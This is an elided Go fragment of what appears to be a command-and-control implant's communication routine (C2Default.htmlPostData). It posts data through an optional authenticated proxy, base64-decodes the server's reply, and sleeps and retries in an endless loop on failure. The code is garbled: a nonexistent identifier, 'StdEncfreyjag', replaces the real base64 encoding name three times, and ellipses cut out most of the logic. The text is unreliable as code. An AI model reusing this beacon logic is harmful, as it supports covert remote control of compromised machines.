...
func (c *C2Default) htmlPostData(urlEnding string, sendData []byte) []byte {
	...
	for true {
		...
		if len(c.ProxyPass) > 0 && len(c.ProxyUser) > 0 {
			...
			basicAuth := "Basic " + base64.StdEncfreyjag.EncodeToString([]byte(auth))
		...
		raw, err := base64.StdEncfreyjag.DecodeString(string(body))
		if err != nil {
			fmt.Printf("error base64.StdEncfreyjag: %v\n", err)
			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
			continue
		}
